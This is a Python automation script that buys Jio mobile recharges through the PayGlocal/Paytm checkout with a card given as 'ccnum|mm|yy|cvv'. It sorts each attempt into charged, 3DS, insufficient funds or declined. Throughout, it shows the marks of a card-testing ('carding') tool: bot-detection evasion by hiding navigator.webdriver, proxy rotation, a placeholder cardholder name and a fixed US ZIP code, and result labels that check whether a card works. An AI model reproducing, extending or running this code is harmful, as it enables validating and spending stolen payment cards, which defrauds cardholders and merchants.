"""
Fast hybrid Jio recharge — final build.

Result detection:
  - 3DS            → URL host match (is_3ds_url)
  - GL-201-008     → insufficient_funds
  - GL-400-005     → declined
  - Other success/decline → Jio callback (myjio-b2b-callback / tx_fields)
  - Last resort    → DOM text regex
"""

import re
import time
import html as _html_mod
import json
from urllib.parse import urlparse, parse_qs
from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

try:
    from curl_cffi import requests as cffi_requests
    _USE_CFFI = True
except ImportError:
    import requests as cffi_requests
    _USE_CFFI = False

# ---------------- CONFIG ----------------
PROXY = ""
HEADLESS = True
JIO_BASE = "https://www.jio.com"
PLANS_URL = "https://www.jio.com/selfcare/recharge/mobility/plans/"
ZIP_CODE = "90001"
# ----------------------------------------

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/126.0.0.0 Safari/537.36")

PAYTM_CODE_HINTS = {
    "202": "insufficient_funds",
    "203": "declined",
    "204": "declined",
    "206": "declined",
    "207": "declined",
    "208": "declined",
    "209": "declined",
    "210": "declined",
    "227": "declined",
    "401": "failed",
    "402": "failed",
}

ISO8583_MAP = {
    "00": "success", "01": "declined", "05": "declined",
    "12": "declined", "13": "declined", "14": "declined",
    "15": "declined", "41": "declined", "43": "declined",
    "51": "insufficient_funds", "54": "declined",
    "57": "declined", "61": "declined", "62": "declined",
    "65": "declined", "75": "declined", "91": "failed",
    "96": "failed", "N7": "declined",
}

# PayGlocal reasonCode → status (only these two map to results;
# 3DS is detected by URL, not by reasonCode).
PAYGLOCAL_REASON_MAP = {
    "GL-201-008": "insufficient_funds",
    "GL-400-005": "declined",
}

def _silent(*_a, **_k):
    pass

def log(tag, msg, color="x"):
    colors = {"g": "\033[92m", "r": "\033[91m", "y": "\033[93m",
              "c": "\033[96m", "m": "\033[95m", "x": "\033[0m"}
    print(f"{colors.get(color,'')}[{tag}]{colors['x']} {msg}", flush=True)

# ===========================================================================
# Playwright singleton
# ===========================================================================
_PW = None
_BROWSER = None
_CTX = None
_BLOCKED_TYPES = {"image", "media", "font"}

def _get_browser():
    global _PW, _BROWSER, _CTX
    if _BROWSER is None:
        _PW = sync_playwright().start()
        _BROWSER = _PW.chromium.launch(
            headless=HEADLESS,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-sandbox",
                "--disable-gpu",
                "--disable-extensions",
                "--disable-background-networking",
                "--disable-sync",
                "--metrics-recording-only",
                "--no-first-run",
                "--disable-ipv6",
                "--disable-features=Translate,BackForwardCache,"
                "AcceptCHFrame,MediaRouter,OptimizationHints",
            ],
        )
        _CTX = _BROWSER.new_context(
            viewport=None,
            user_agent=UA,
            locale="en-IN",
            timezone_id="Asia/Kolkata",
            ignore_https_errors=True,
        )
        _CTX.add_init_script(
            "Object.defineProperty(navigator,'webdriver',{get:()=>undefined})"
        )
        def _route_handler(route):
            try:
                if route.request.resource_type in _BLOCKED_TYPES:
                    route.abort()
                else:
                    route.continue_()
            except Exception:
                try:
                    route.continue_()
                except Exception:
                    pass
        _CTX.route("**/*", _route_handler)
    return _BROWSER, _CTX

def close_browser():
    global _PW, _BROWSER, _CTX
    try:
        if _BROWSER:
            _BROWSER.close()
    except Exception:
        pass
    try:
        if _PW:
            _PW.stop()
    except Exception:
        pass
    _PW = _BROWSER = _CTX = None

# ===========================================================================
# 3DS detection — URL host only
# ===========================================================================
def is_3ds_url(url):
    if not url:
        return False
    u = url.lower()

    if "easebuzz" in u and "/acs/" in u:
        return False
    if "paytmpayments.com" in u and "bankresponse" in u:
        return False

    try:
        host = (urlparse(url).hostname or "").lower()
    except Exception:
        host = ""

    if not host:
        return False

    if "arcot.com" in host:
        return True
    if "cardinalcommerce.com" in host or "cardinal.com" in host:
        return True
    if host.startswith("cardinal."):
        return True
    if host.startswith("acs.") or ".acs." in host:
        return True
    if host.startswith("3ds") or ".3ds." in host:
        return True
    if "3dsecure" in host:
        return True
    if "accesscontrolserver" in host:
        return True
    if "entersekt" in host or "modirum" in host or "netcetera" in host:
        return True
    if "verifiedbyvisa" in host:
        return True
    if "americanexpress.com" in host and "safekey" in u:
        return True
    if "mastercard.com" in host and "identitycheck" in u:
        return True
    if "capitalone.com" in host and ("acs" in host or "challenge" in u):
        return True

    if "/tds2/" in u and "/browser/" in u:
        return True
    if "/creq/" in u and "arcot" in u:
        return True
    if "/challenge/step" in u or "/challenge/verify" in u:
        return True
    if "/protected/" in u and "/challenge/" in u:
        return True

    return False

# ===========================================================================
# Form field extraction + callback parsing
# ===========================================================================
def _extract_form_fields(html):
    try:
        pairs = re.findall(
            r"""name=['"]([^'"]+)['"]\s+value=['"]([^'"]*)['"]""",
            html
        )
        if not pairs:
            return None
        return {k: _html_mod.unescape(v) for k, v in pairs}
    except Exception:
        return None

def _first_sentence(text):
    if not text:
        return ""
    match = re.search(r'[^.!?]+[.!?]?', text)
    return match.group(0).strip() if match else text.strip()

def parse_callback(cb_url, cb_post, tx_fields):
    fields = {}
    if tx_fields:
        fields.update(tx_fields)
    if cb_post:
        try:
            bp = parse_qs(cb_post)
            for k, v in bp.items():
                fields.setdefault(k, v[0] if v else "")
        except Exception:
            pass
    if cb_url:
        try:
            qp = parse_qs(urlparse(cb_url).query)
            for k, v in qp.items():
                fields.setdefault(k, v[0] if v else "")
        except Exception:
            pass
    if not fields:
        return None

    status = (fields.get("STATUS") or "").strip().upper()
    respcode = (fields.get("RESPCODE") or fields.get("errorCode") or "").strip()
    respmsg = (fields.get("RESPMSG") or fields.get("errorMessage") or "").strip()
    txnid = (fields.get("TXNID") or "").strip()
    amount = (fields.get("TXNAMOUNT") or "").strip()

    if status == "TXN_SUCCESS" or respcode == "00":
        return ("success", f"Charged ₹{amount} | txn={txnid}")
    if status in ("PENDING", "INPROGRESS"):
        return None
    if status == "TXN_FAILURE":
        low = respmsg.lower()
        if any(k in low for k in (
            "insufficient", "enough balance",
            "do not have enough", "not enough balance",
            "limit exceeded",
        )):
            return ("insufficient_funds", _first_sentence(respmsg))
        if any(k in low for k in (
            "declin", "not authori", "do not honor", "do not honour",
            "expired", "invalid card", "lost", "stolen", "pickup",
            "restricted", "invalid cvv", "incorrect cvv",
            "security code",
        )):
            return ("declined", _first_sentence(respmsg))
        if respcode:
            if respcode in PAYTM_CODE_HINTS:
                return (PAYTM_CODE_HINTS[respcode], _first_sentence(respmsg))
            if respcode in ISO8583_MAP:
                mapped = ISO8583_MAP[respcode]
                if mapped == "success":
                    return ("success", f"Charged ₹{amount} | txn={txnid}")
                return (mapped, _first_sentence(respmsg))
        return ("failed", _first_sentence(respmsg))
    return None

def parse_payglocal_json(data):
    """
    Classify PayGlocal JSON ONLY by these two reasonCodes:
      GL-201-008 → insufficient_funds
      GL-400-005 → declined
    3DS is handled by URL, not here.
    No matching reasonCode → None (keep polling).
    """
    if not data:
        return None

    reason = (data.get("reasonCode") or "").strip().upper()
    if not reason:
        return None

    status = PAYGLOCAL_REASON_MAP.get(reason)
    if not status:
        return None

    errors = data.get("errors") or {}
    detailed = (errors.get("detailedMessage") or "").strip()
    message = (data.get("message") or "").strip()
    human = detailed or message or reason

    return (status, _first_sentence(human))

# ===========================================================================
# requests-side helpers
# ===========================================================================
def _proxy_to_url(entry):
    if not entry:
        return None
    s = entry.strip()
    if not s:
        return None
    if "://" in s:
        return s
    if "@" in s:
        creds, hp = s.rsplit("@", 1)
        return f"http://{creds}@{hp}"
    parts = s.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    return s

def _new_session(proxy=None):
    if _USE_CFFI:
        try:
            s = cffi_requests.Session(impersonate="chrome")
        except TypeError:
            s = cffi_requests.Session()
    else:
        s = cffi_requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": JIO_BASE,
        "Connection": "keep-alive",
    })
    if _USE_CFFI:
        try:
            s.http2 = True
        except Exception:
            pass
    if proxy:
        proxy_url = _proxy_to_url(proxy)
        s.proxies = {"http": proxy_url, "https": proxy_url}
    return s

def _find_plan_key(data, amount):
    target = str(amount).strip()
    def walk(node, depth=0):
        if depth > 14:
            return None
        if isinstance(node, dict):
            price = (node.get("price") or node.get("amount")
                     or node.get("planAmount") or node.get("mrp"))
            key = (node.get("planKey") or node.get("planId")
                   or node.get("key") or node.get("id"))
            if price is not None and key:
                p = str(price).replace("₹", "").replace(",", "").strip()
                if p == target or p == f"{target}.0" or p == f"{target}.00":
                    return str(key)
            if isinstance(price, dict):
                pv = (price.get("value") or price.get("amount")
                      or price.get("mrp"))
                if pv is not None and key:
                    p = str(pv).replace("₹", "").replace(",", "").strip()
                    if p == target:
                        return str(key)
            for v in node.values():
                r = walk(v, depth + 1)
                if r:
                    return r
        elif isinstance(node, list):
            for item in node:
                r = walk(item, depth + 1)
                if r:
                    return r
        return None
    return walk(data)

def jio_half(phone, amount, log_fn=_silent):
    s = _new_session(PROXY)
    s.get(f"{JIO_BASE}/selfcare/recharge/mobility/",
          headers={"Accept": "text/html,*/*"}, timeout=30)
    r = s.get(
        f"{JIO_BASE}/api/jio-recharge-service/recharge/mobility/number/{phone}",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Referer": f"{JIO_BASE}/selfcare/recharge/mobility/",
        },
        timeout=30,
    )
    if r.status_code != 200:
        raise RuntimeError(f"phone submit HTTP {r.status_code}")
    plans_referer = (f"{PLANS_URL}?serviceId={phone}&serviceType=mobility"
                     f"&next=PREPAID&billingType=PREPAID")
    r = s.get(
        f"{JIO_BASE}/api/jio-recharge-service/recharge/plans/serviceId/{phone}",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Referer": plans_referer,
        },
        timeout=30,
    )
    if r.status_code != 200:
        raise RuntimeError(f"plans HTTP {r.status_code}")
    plan_key = _find_plan_key(r.json(), amount)
    if not plan_key:
        raise RuntimeError(f"no Rs.{amount} plan found")
    r = s.post(
        f"{JIO_BASE}/api/jio-recharge-service/recharge/buy",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": plans_referer,
        },
        json={"planKey": plan_key, "selectedService": phone},
        timeout=30,
    )
    if r.status_code != 200:
        raise RuntimeError(f"buy HTTP {r.status_code}")
    r = s.post(
        f"{JIO_BASE}/api/jio-recharge-service/recharge/pay",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": plans_referer,
        },
        json={
            "addonPlanKeys": [],
            "flexiTopupFlow": False,
            "servicePlanList": [{
                "planKey": plan_key,
                "quantity": 1,
                "serviceId": phone,
            }],
        },
        timeout=30,
        allow_redirects=False,
    )
    r2 = s.get(
        f"{JIO_BASE}/api/jio-common-servlet/jiocommon/redirect",
        headers={
            "Accept": "text/html,application/xhtml+xml,*/*",
            "Referer": plans_referer,
        },
        timeout=30,
        allow_redirects=False,
    )
    return r2.text, s.cookies, plan_key

# ===========================================================================
# Playwright helpers
# ===========================================================================
def _click_first(page, selectors, timeout=8000):
    for target in [page] + list(page.frames):
        for sel in selectors:
            try:
                loc = target.locator(sel).first
                loc.wait_for(state="visible", timeout=timeout)
                loc.click(timeout=timeout)
                return True
            except Exception:
                continue
    return False

def _try_fill_zip(page, zip_code, wait_ms=800):
    """Fill #gl_billing_addressPostalCode with React-safe native setter."""
    if not zip_code:
        return False

    sel = "#gl_billing_addressPostalCode"

    found = False
    deadline = time.time() + (wait_ms / 1000.0)
    while time.time() < deadline:
        for target in [page] + list(page.frames):
            try:
                exists = target.evaluate(
                    """(sel) => {
                        const el = document.querySelector(sel);
                        return el && el.offsetParent !== null;
                    }""", sel)
                if exists:
                    found = True
                    break
            except Exception:
                continue
        if found:
            break
        page.wait_for_timeout(100)

    if not found:
        log("zip", f"no ZIP field ({sel}) after {wait_ms}ms — skipping to Pay", "y")
        return False

    for target in [page] + list(page.frames):
        try:
            res = target.evaluate("""(args) => {
                const [sel, zip] = args;
                const el = document.querySelector(sel);
                if (!el) return 'no-input';
                const setter = Object.getOwnPropertyDescriptor(
                    window.HTMLInputElement.prototype, 'value'
                ).set;
                el.scrollIntoView({block: 'center'});
                el.focus();
                setter.call(el, '');
                setter.call(el, zip);
                el.dispatchEvent(new Event('input',  {bubbles: true}));
                el.dispatchEvent(new Event('change', {bubbles: true}));
                el.dispatchEvent(new Event('blur',   {bubbles: true}));
                return el.value === zip ? 'filled' : 'mismatch:' + el.value;
            }""", [sel, zip_code])
            if res == 'filled':
                log("zip", f"filled {sel} → {zip_code}", "g")
                return True
        except Exception:
            continue

    for target in [page] + list(page.frames):
        try:
            loc = target.locator(sel).first
            if loc.count() == 0 or not loc.is_visible(timeout=500):
                continue
            loc.click()
            try:
                loc.fill("")
            except Exception:
                pass
            loc.press_sequentially(zip_code, delay=60)
            log("zip", f"typed {sel} → {zip_code}", "g")
            return True
        except Exception:
            continue

    log("zip", "field exists but could not fill", "y")
    return False

def _click_payglocal_pay(page):
    """Handles both PayGlocal Pay buttons."""
    # 1a: INR button
    for target in [page] + list(page.frames):
        try:
            loc = target.locator('#network_dcc_v2_pay_INR')
            if loc.count() > 0 and loc.first.is_visible():
                loc.first.scroll_into_view_if_needed()
                loc.first.click(timeout=1500)
                log("pay", "clicked #network_dcc_v2_pay_INR", "g")
                return True
        except Exception:
            continue

    # 1b: Pay Now button (₹11 plan)
    for target in [page] + list(page.frames):
        try:
            loc = target.locator('#card_paynow_button')
            if loc.count() > 0 and loc.first.is_visible():
                loc.first.scroll_into_view_if_needed()
                loc.first.click(timeout=1500)
                log("pay", "clicked #card_paynow_button", "g")
                return True
        except Exception:
            continue

    # 2: id prefix / suffix
    for target in [page] + list(page.frames):
        for sel in (
            'button[id^="network_dcc_v2_pay_"]',
            'button[id*="network_dcc_v2_pay"]',
            'button[id$="_pay_INR"]',
            'button[id$="_paynow_button"]',
            'button[id*="paynow"]',
        ):
            try:
                loc = target.locator(sel).first
                if loc.is_visible(timeout=300):
                    loc.scroll_into_view_if_needed()
                    loc.click(timeout=1500)
                    log("pay", f"clicked {sel}", "g")
                    return True
            except Exception:
                continue

    # 3: JS by text
    for target in [page] + list(page.frames):
        try:
            res = target.evaluate("""() => {
                const all = [...document.querySelectorAll(
                    'button, a, div[role="button"], input[type="button"], input[type="submit"]'
                )];
                for (const el of all) {
                    const t = (el.innerText || el.value || '').trim();
                    if (/\\bPay\\b/i.test(t) && /₹/.test(t) && /INR/i.test(t)) {
                        el.scrollIntoView({block: 'center'});
                        el.click();
                        return 'clicked: ' + t.slice(0, 60);
                    }
                }
                for (const el of all) {
                    const t = (el.innerText || el.value || '').trim();
                    if (/\\bPay\\b/i.test(t) && /INR/i.test(t)) {
                        el.scrollIntoView({block: 'center'});
                        el.click();
                        return 'clicked: ' + t.slice(0, 60);
                    }
                }
                for (const el of all) {
                    const t = (el.innerText || el.value || '').trim();
                    if (/^Pay\\s*Now$/i.test(t)) {
                        el.scrollIntoView({block: 'center'});
                        el.click();
                        return 'clicked: ' + t.slice(0, 60);
                    }
                }
                return 'no-match';
            }""")
            if res and res.startswith("clicked"):
                log("pay", f"JS {res}", "g")
                return True
        except Exception:
            continue

    # 4: Playwright has-text
    for target in [page] + list(page.frames):
        for sel in (
            '#card_paynow_button',
            'button:has-text("Pay Now")',
            'button:has-text("Pay")',
            'a:has-text("Pay")',
            '[role="button"]:has-text("Pay")',
        ):
            try:
                for btn in target.locator(sel).all():
                    txt = (btn.inner_text() or "").strip()
                    if "INR" in txt or "₹" in txt or txt.lower() == "pay now":
                        btn.scroll_into_view_if_needed()
                        btn.click(timeout=1500)
                        log("pay", f"clicked: {txt[:60]}", "g")
                        return True
            except Exception:
                continue

    log("pay", "no Pay button found — continuing anyway", "y")
    return False

# ===========================================================================
# Main Playwright half
# ===========================================================================
def payglocal_half(redirect_html, cookies, card, zip_code,
                   proxy=None, log_fn=_silent):
    result = {"status": "error", "reason": None, "url": None}

    browser, ctx = _get_browser()

    if cookies:
        try:
            ck = []
            for name, value in dict(cookies).items():
                for domain in ("www.jio.com", "pay.jio.com"):
                    ck.append({"name": name, "value": value,
                               "domain": domain, "path": "/"})
            ctx.add_cookies(ck)
        except Exception:
            pass

    page = ctx.new_page()
    callback = {"url": None, "post_data": ""}
    detected = {"tx_fields": None, "pg_json": None}

    def _on_request(req):
        try:
            if "myjio-b2b-callback" in (req.url or ""):
                callback["url"] = req.url
                try:
                    callback["post_data"] = req.post_data or ""
                except Exception:
                    callback["post_data"] = ""
        except Exception:
            pass

    def _on_response(resp):
        try:
            u = resp.url or ""
            u_lower = u.lower()

            # Paytm transaction status HTML
            is_txn_status_html = (
                "transactionstatus" in u_lower
                or "bankresponse" in u_lower
                or ("paytm" in u_lower and "status" in u_lower)
                or ("paytmpayments" in u_lower)
            )
            if is_txn_status_html:
                try:
                    body = resp.text()
                except Exception:
                    return
                body_upper = body.upper()
                if "<FORM" in body_upper and "TXNID" in body_upper:
                    fields = _extract_form_fields(body)
                    if fields:
                        detected["tx_fields"] = fields
                        log("capture", f"paytm tx_fields from {u[:80]}", "c")
                return

            # PayGlocal JSON — only store if reasonCode matches our map
            if "payglocal" in u_lower:
                try:
                    body = resp.text()
                except Exception:
                    return
                if body.strip().startswith("{"):
                    try:
                        data = json.loads(body)
                    except Exception:
                        return
                    rc = (data.get("reasonCode") or "").strip().upper()
                    if rc in PAYGLOCAL_REASON_MAP:
                        detected["pg_json"] = data
                        log("capture",
                            f"payglocal JSON: {data.get('status','')} ({rc})",
                            "c")
        except Exception:
            pass

    page.on("request", _on_request)
    page.on("response", _on_response)

    try:
        page.goto("about:blank", wait_until="commit", timeout=5000)

        redirect_url = (f"{JIO_BASE}/api/jio-common-servlet/"
                        f"jiocommon/redirect")
        try:
            page.goto(redirect_url, wait_until="commit", timeout=20000)
        except Exception:
            pass

        landed = False
        for _ in range(60):
            page.wait_for_timeout(150)
            cur = page.url or ""
            if "pay.jio.com" in cur:
                landed = True
                break
            if ("jio.com" in cur
                    and "jiocommon/redirect" not in cur):
                break

        if not landed:
            try:
                page.wait_for_url(re.compile(r"pay\.jio\.com"),
                                  timeout=10000)
                landed = True
            except PWTimeout:
                pass

        if not landed:
            result.update(status="error",
                          reason="redirect did not reach pay.jio.com",
                          url=page.url)
            return result

        # ===== card option =====
        card_clicked = False
        card_selectors = [
            'div.j-listBlock__main:has-text("Credit/Debit/ATM Card")',
            'div.j-listBlock__main:has-text("Debit Card")',
            'div.j-listBlock__main:has-text("Credit Card")',
            'div.j-listBlock__main:has-text("ATM Card")',
            'div.j-listBlock__main:has-text("Card")',
            'div[class*="j-listBlock__main"]:has-text("Card")',
        ]
        deadline_card = time.time() + 15
        while time.time() < deadline_card and not card_clicked:
            for sel in card_selectors:
                for target in [page] + list(page.frames):
                    try:
                        loc = target.locator(sel).first
                        if loc.is_visible(timeout=300):
                            loc.scroll_into_view_if_needed()
                            loc.click(timeout=2000)
                            card_clicked = True
                            break
                    except Exception:
                        continue
                if card_clicked:
                    break
            if not card_clicked:
                for target in [page] + list(page.frames):
                    try:
                        res = target.evaluate("""() => {
                            const leaf = [...document.querySelectorAll(
                                    'div, span')]
                                .find(e =>
                                    /^Credit\\/Debit\\/ATM Card$/i.test(
                                        (e.innerText || '').trim())
                                    && e.offsetParent !== null);
                            if (!leaf) return 'no-leaf';
                            let n = leaf;
                            for (let i = 0; i < 8 && n; i++) {
                                if (n.classList &&
                                    n.classList.contains(
                                        'j-listBlock__main')) {
                                    n.scrollIntoView({block:'center'});
                                    n.click();
                                    return 'clicked-main';
                                }
                                n = n.parentElement;
                            }
                            n = leaf;
                            for (let i = 0; i < 8 && n; i++) {
                                if (n.className &&
                                    /j-listBlock/i.test(
                                        n.className.toString())) {
                                    n.click();
                                    return 'clicked-block';
                                }
                                n = n.parentElement;
                            }
                            leaf.click();
                            return 'clicked-leaf';
                        }""")
                        if res and res.startswith("clicked"):
                            card_clicked = True
                            break
                    except Exception:
                        continue
            if not card_clicked:
                page.wait_for_timeout(150)

        if not card_clicked:
            result.update(status="error",
                          reason="card option not found after 15s",
                          url=page.url)
            return result

        # ===== wait for card form =====
        form_ready = False
        for _ in range(100):
            page.wait_for_timeout(150)
            for target in [page] + list(page.frames):
                try:
                    n = target.evaluate("""() => {
                        return [...document.querySelectorAll('input')]
                            .filter(i => i.offsetParent !== null
                                      && i.type !== 'hidden')
                            .length;
                    }""")
                    if n and n >= 2:
                        form_ready = True
                        break
                except Exception:
                    continue
            if form_ready:
                break

        # ===== fill card =====
        card_fields = [
            ('#cardNumber', card["number"], True),
            ('input[name="Expiry (MM/YY)"]', card["expiry"], False),
            ('input[name="CVV"]', card["cvv"], False),
            ('input[name="Name on the card"]', card["name"], False),
        ]
        card_num_ok = False
        for sel, val, is_card_num in card_fields:
            filled = False
            for target in [page] + list(page.frames):
                try:
                    loc = target.locator(sel).first
                    loc.wait_for(state="visible", timeout=2000)
                    loc.click()
                    loc.fill(val)
                    filled = True
                    if is_card_num:
                        card_num_ok = True
                    break
                except Exception:
                    continue
            if is_card_num and not filled:
                result.update(status="error",
                              reason="card number input not found",
                              url=page.url)
                return result

        try:
            if page.locator(
                    'input[name="Expiry (MM/YY)"]').count() == 0:
                mm, yy = card["expiry"].split("/")
                for sel, val in [
                    ('input[name*="month" i]', mm),
                    ('input[name*="year" i]', yy),
                ]:
                    for target in [page] + list(page.frames):
                        try:
                            loc = target.locator(sel).first
                            loc.wait_for(state="visible", timeout=1500)
                            loc.click()
                            loc.fill(val)
                            break
                        except Exception:
                            continue
        except Exception:
            pass

        # ===== proceed =====
        proceed_clicked = False
        try:
            loc = page.locator(
                'button[aria-label="button Proceed"]').first
            loc.wait_for(state="visible", timeout=2500)
            loc.click(timeout=2000)
            proceed_clicked = True
        except Exception:
            pass
        if not proceed_clicked:
            for target in [page] + list(page.frames):
                try:
                    loc = target.locator(
                        'button:has-text("Proceed")').first
                    if loc.is_visible(timeout=1500):
                        loc.click(timeout=2000)
                        proceed_clicked = True
                        break
                except Exception:
                    continue
        if not proceed_clicked:
            _click_first(page, [
                'button:has-text("Pay")',
                'button:has-text("Submit")',
                'button:has-text("Continue")',
                'button:has-text("Pay Now")',
                'input[type="submit"]',
                'button[type="submit"]',
            ], timeout=3000)

        # ============================================================
        # POLL LOOP (15s cap)
        # Order: 3DS URL → reasonCode JSON → Paytm callback → ready
        # ============================================================
        payglocal_ready = False
        readiness_deadline = time.time() + 15
        while time.time() < readiness_deadline:
            if is_3ds_url(page.url):
                result.update(status="3ds_required",
                              reason=f"3DS: {page.url[:100]}",
                              url=page.url)
                return result

            pg = parse_payglocal_json(detected.get("pg_json"))
            if pg:
                st, reason = pg
                result.update(status=st, reason=reason, url=page.url)
                log("result", f"{st} — {reason[:80]}",
                    "g" if st in ("success", "charged") else "r")
                return result

            pre = parse_callback(callback.get("url"),
                                 callback.get("post_data"),
                                 detected.get("tx_fields"))
            if pre:
                st, reason = pre
                result.update(status=st, reason=reason, url=page.url)
                log("result", f"{st} — {reason[:80]}",
                    "g" if st in ("success", "charged") else "r")
                return result

            for target in [page] + list(page.frames):
                try:
                    inr_btn = target.locator('#network_dcc_v2_pay_INR')
                    if inr_btn.count() > 0 and inr_btn.first.is_visible():
                        payglocal_ready = True
                        log("pay", "PayGlocal ready (INR button)", "g")
                        break
                    paynow_btn = target.locator('#card_paynow_button')
                    if paynow_btn.count() > 0 and paynow_btn.first.is_visible():
                        payglocal_ready = True
                        log("pay", "PayGlocal ready (Pay Now button)", "g")
                        break
                except Exception:
                    continue
            if payglocal_ready:
                break

            page.wait_for_timeout(200)

        # ============================================================
        # PayGlocal: ZIP fill + Pay click
        # ============================================================
        if zip_code:
            _try_fill_zip(page, zip_code, wait_ms=800)

        _click_payglocal_pay(page)

        # ============================================================
        # RESULT LOOP
        # Order per iteration:
        #   1. 3DS URL
        #   2. reasonCode JSON (GL-201-008 / GL-400-005)
        #   3. Paytm callback
        #   4. DOM text
        # ============================================================
        success_re = re.compile(
            r"recharge\s+successful|recharge\s+success|"
            r"recharge\s+completed|recharge\s+confirmed|"
            r"transaction\s+successful|thank\s+you\s+for\s+recharg|"
            r"successfully\s+recharged",
            re.I)
        failure_re = re.compile(
            r"payment\s+failed|transaction\s+failed|recharge\s+failed|"
            r"declined|insufficient|not\s+have\s+enough\s+balance|"
            r"enough\s+balance|invalid\s+card|cancelled|canceled|"
            r"retry\s+payment|try\s+again|"
            r"hasn'?t\s+been\s+charged|has\s+not\s+been\s+charged|"
            r"use\s+a\s+different\s+card|Add\s+balance\s+and\s+try",
            re.I)

        def strip_html(html):
            t = re.sub(r"<script[^>]*>.*?</script>", " ", html,
                       flags=re.I | re.S)
            t = re.sub(r"<style[^>]*>.*?</style>", " ", t,
                       flags=re.I | re.S)
            t = re.sub(r"<[^>]+>", " ", t)
            t = re.sub(r"&nbsp;", " ", t)
            return re.sub(r"\s+", " ", t).strip()

        deadline = time.time() + 180
        iter_count = 0
        while time.time() < deadline:
            iter_count += 1
            if iter_count % 10 == 0:
                log("wait", f"result loop iter {iter_count} url={page.url[:70]}", "c")

            # 1. 3DS via URL
            if is_3ds_url(page.url):
                result.update(status="3ds_required",
                              reason=f"3DS: {page.url[:100]}",
                              url=page.url)
                return result

            # 2. reasonCode JSON (insufficient_funds / declined)
            pg = parse_payglocal_json(detected.get("pg_json"))
            if pg:
                st, reason = pg
                result.update(status=st, reason=reason, url=page.url)
                log("result", f"{st} — {reason[:80]}",
                    "g" if st in ("success", "charged") else "r")
                return result

            # 3. Paytm callback
            parsed = parse_callback(callback.get("url"),
                                    callback.get("post_data"),
                                    detected.get("tx_fields"))
            if parsed:
                st, reason = parsed
                result.update(status=st, reason=reason, url=page.url)
                log("result", f"{st} — {reason[:80]}",
                    "g" if st in ("success", "charged") else "r")
                return result

            # 4. DOM text fallback
            try:
                body = page.content()
            except Exception:
                body = ""
            for fr in page.frames:
                try:
                    body += "\n" + fr.content()
                except Exception:
                    continue
            text = strip_html(body)
            low = text.lower()

            if failure_re.search(text):
                if "insufficient" in low or "enough balance" in low:
                    result.update(
                        status="insufficient_funds",
                        reason="Your card does not have enough balance",
                        url=page.url)
                    return result
                if "declin" in low:
                    result.update(status="declined",
                                  reason="Payment declined.",
                                  url=page.url)
                    return result
                result.update(status="failed",
                              reason="Payment failed.",
                              url=page.url)
                return result

            if success_re.search(text):
                result.update(status="success",
                              reason="Recharge successful.",
                              url=page.url)
                return result

            time.sleep(0.25)

        result.update(status="pending",
                      reason="Still processing.",
                      url=page.url)
        return result

    except Exception as e:
        result.update(status="error",
                      reason=f"{type(e).__name__}: {e}",
                      url=page.url if 'page' in locals() else None)
        return result
    finally:
        try:
            page.close()
        except Exception:
            pass

# ===========================================================================
# Entry point
# ===========================================================================
def run_recharge(phone, amount, card, zip_code=ZIP_CODE, log_fn=_silent):
    try:
        redirect_html, cookies, plan_key = jio_half(
            phone, amount, log_fn=log_fn)
    except Exception as e:
        return {"status": "error",
                "reason": f"jio_half: {type(e).__name__}: {e}",
                "url": None}
    proxy = None
    if PROXY:
        s = PROXY.strip()
        if "://" in s:
            m = re.match(r"^(\w+)://(?:([^:]+):([^@]+)@)?([^:]+):(\d+)$", s)
            if m:
                scheme, user, pwd, host, port = m.groups()
                proxy = {"server": f"{scheme}://{host}:{port}"}
                if user:
                    proxy["username"] = user
                    proxy["password"] = pwd
        elif "@" in s:
            creds, hp = s.rsplit("@", 1)
            user, pwd = (creds.split(":", 1) if ":" in creds
                         else (creds, ""))
            host, _, port = hp.partition(":")
            proxy = {"server": f"http://{host}:{port}",
                     "username": user, "password": pwd}
        else:
            parts = s.split(":")
            if len(parts) == 4:
                host, port, user, pwd = parts
                proxy = {"server": f"http://{host}:{port}",
                         "username": user, "password": pwd}
            elif len(parts) == 2:
                host, port = parts
                proxy = {"server": f"http://{host}:{port}"}
    return payglocal_half(redirect_html, cookies, card, zip_code,
                          proxy=proxy, log_fn=log_fn)

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 4:
        print("Usage: python jio_final.py <phone> <amount> "
              "<ccnum|mm|yy|cvv>")
        sys.exit(1)
    phone = sys.argv[1]
    amount = sys.argv[2]
    card_line = sys.argv[3]
    parts = re.split(r"[|,;\s]+", card_line)
    if len(parts) != 4:
        print("Bad card format. Use ccnum|mm|yy|cvv")
        sys.exit(1)
    pan, mm, yy, cvv = parts
    card = {
        "number": pan,
        "expiry": f"{mm.zfill(2)}/{yy[-2:]}",
        "cvv": cvv,
        "name": "Card Holder",
    }
    print("=" * 90)
    log("start", f"card={pan[:6]}...{pan[-4:]} phone={phone} ₹{amount}", "g")
    print("=" * 90)
    start = time.time()
    try:
        result = run_recharge(phone, amount, card, ZIP_CODE)
        elapsed = time.time() - start
        icons = {"success": "💎 SUCCESS", "charged": "💎 CHARGED",
                 "3ds_required": "🔐 3DS",
                 "insufficient_funds": "💸 INSUFFICIENT",
                 "declined": "❌ DECLINED", "failed": "❌ FAILED",
                 "pending": "⏳ PENDING", "error": "🌐 ERROR"}
        st = result["status"]
        label = icons.get(st, st.upper())
        print("=" * 90)
        print(f"{label:20s} {result.get('reason') or '-'}")
        log("time", f"{elapsed:.2f}s", "c")
        print("=" * 90)
    finally:
        close_browser()